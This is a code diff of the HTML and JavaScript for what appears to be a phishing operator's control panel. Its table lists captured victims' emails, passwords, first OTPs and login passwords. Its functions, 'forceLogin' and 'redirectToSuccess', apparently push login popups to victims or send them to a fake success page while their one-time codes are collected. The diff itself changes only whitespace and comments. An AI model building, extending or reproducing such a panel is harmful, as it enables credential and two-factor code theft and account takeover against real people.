@@ -222,7 +222,7 @@ td{
   <div class="table-container">
       <table>
       <thead>
-         <tr>
+          <tr>
           <th>Email</th>
           <th>Password</th>
           <th>First OTP</th>
@@ -231,12 +231,12 @@ td{
           <th>Login Password</th>
           <th>Status</th>
           <th>Actions</th>
-         </tr>
+          </tr>
       </thead>
       <tbody id="usersTableBody">
         <tr><td colspan="8" style="text-align:center; padding:40px;">Loading...</td></tr>
       </tbody>
-     </table>
+      </table>
   </div>
 </div>
 
@@ -332,7 +332,7 @@ td{
     Notification.requestPermission();
   }
 
-  // Copy to clipboard function
+  // Copy to clipboard function (ADDED)
   function copyToClipboard(text, fieldName) {
     navigator.clipboard.writeText(text).then(() => {
       showNotification('Copied!', `${fieldName} copied to clipboard`, 'otp');
@@ -456,7 +456,7 @@ td{
     }
   }
 
-  // Force Login - NEW
+  // Force Login (ADDED)
   async function forceLogin(email) {
     showNotification('Force Login', `Forcing login popup for ${email}`, 'second-otp');
     try {
@@ -477,7 +477,7 @@ td{
     }
   }
 
-  // Redirect to Success - NEW
+  // Redirect to Success (ADDED)
   async function redirectToSuccess(email) {
     showNotification('Redirect to Success', `Redirecting ${email} to success page`, 'success');
     try {
